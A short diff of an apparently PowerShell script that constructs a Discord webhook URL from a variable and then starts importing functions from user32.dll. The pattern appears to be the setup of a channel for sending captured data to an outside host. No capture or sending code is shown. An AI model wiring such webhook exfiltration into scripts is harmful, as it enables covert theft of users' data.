@@ -1,4 +1,7 @@
-﻿$whuri = "$dc"
+$whuri = "$dc"
+if ($whuri.Length -lt 120){
+	$whuri = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 $signature = @'
 [DllImport("user32.dll")]
